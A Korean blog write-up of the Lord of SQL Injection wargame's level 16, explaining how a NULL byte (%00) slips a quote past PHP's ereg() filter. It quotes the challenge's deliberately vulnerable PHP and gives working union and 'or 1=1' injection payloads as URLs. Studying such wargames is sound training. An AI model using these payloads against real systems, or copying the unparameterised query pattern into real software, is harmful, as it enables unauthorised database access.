---
title: Lord of SQL Injection Write Up No.16 Zombie Assassin
date: 2019-09-01 20:47:20
updated:
categories:
  - Write Up
tags:
  - Lord of SQL Injection
  - Infosec
---

## 개요

{% img /image/los-main.png 300 %}

SQL Injection에 대한 지식을 쌓기 위해 [Lord of SQL Injection 사이트](https://los.eagle-jump.org/)의 문제를 풀고 해답을 정리한다.

이 문서에서는 Lord of SQL Injection 16번 zombie-assassin 문제에 대하여 정리한다.

<!-- more -->

## 문제 분석

### 문제 출제 의도

`'`을 필터링하는 `ereg()` 함수를 우회하여 SQL Injection을 할 수 있는지 확인한다.

### 필요 배경 지식

#### ereg

```php
int ereg ( string $pattern , string $string [, array &$regs ] )
```

- 이미 8번 Troll 문제에서 대소문자 구분 관련 취약점이 밝혀진 `ereg` 함수이다.
- 하지만 `ereg` 함수가 PHP 5.3+ 부터 더 이상 쓰이지 않게 된 이유는 대소문자 구분 때문이 아니다.
- `ereg` 함수는 POSIX Regex 함수의 하나로 PHP 5.3+ 버전에서 `NULL`문자를 만나면 더 이상 뒤의 문자열을 체크하지 않는 취약점을 가지고 있다.
- php의 `ereg` 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.
- [PHP: ereg - Manual](http://php.net/manual/kr/function.ereg.php)
- POSIX Regex 함수의 취약점에 대해 잘 모르겠다면 다음 링크를 참고하자.
- [POSIX Regex와 PCRE Regex](http://blog.do9.kr/entry/POSIX-Regex%EC%99%80-PCRE-Regex)

### 소스 코드 분석

zombie_assassin 문제의 php 소스 코드는 다음과 같다.

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(@ereg("'",$_GET[id])) exit("HeHe");
  if(@ereg("'",$_GET[pw])) exit("HeHe");
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("zombie_assassin");
  highlight_file(__FILE__);
?>
```

#### Filter

```php
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(@ereg("'",$_GET[id])) exit("HeHe");
  if(@ereg("'",$_GET[pw])) exit("HeHe");
```

- GET 방식으로 `id`와 `pw`를 받고, `id`나 `pw`에 `\`, `prob`, `_`, `.`, `()` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.
- 또한, `id`나 `pw`에 `'` 이 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

#### Query

```php
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("zombie_assassin");
```

- 받은 `id`가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.
- 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 `id`에 참이 되는 어떤 문자열이든 들어있음'이다.

## Solution

1. NULL 문자 이용

   PHP의 `ereg()` 함수 부분을 보면

   ```php
   if(@ereg("'",$_GET[id])) exit("HeHe");
   if(@ereg("'",$_GET[pw])) exit("HeHe");
   ```

   `ereg()` 함수는 `NULL` 문자를 만나면 더 이상 뒤의 문자열을 체크하지 않는다.

   `NULL` 문자는 URL Encoding을 하면 `%00`이 된다.

   따라서 입력값으로 `%00' union select 1-- -`, `%00' or 1=1-- -` 과 같이 `NULL` 문자가 `'` 앞에 오도록 값을 넣으면 `ereg()` 함수에서 필터링이 이루어지지 않으며, SQL문을 적당히 조작하여 값이 반환되도록 하면 문제가 풀리게 된다.

   ```url
   http://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=%00' union select 1-- -
   http://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=%00' or 1=1-- -
   ```

   ```sql
   select id from prob_zombie_assassin where id='' union select 1-- -' and pw=''
   select id from prob_zombie_assassin where id='' or 1=1-- -' and pw=''
   ```
